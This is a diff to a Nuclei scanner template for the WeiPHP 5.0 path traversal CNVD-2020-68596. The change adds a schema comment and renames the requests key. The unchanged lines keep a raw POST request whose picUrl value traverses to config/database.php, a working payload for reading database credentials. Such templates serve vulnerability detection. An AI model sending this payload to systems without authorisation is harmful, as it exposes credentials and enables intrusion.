@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2020-68596
 info:
   name: WeiPHP 5.0 - Path Traversal
@@ -11,7 +12,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: weiphp,lfi,cnvd,cnvd2020
-requests:
+http:
   - raw:
       - |
         POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1
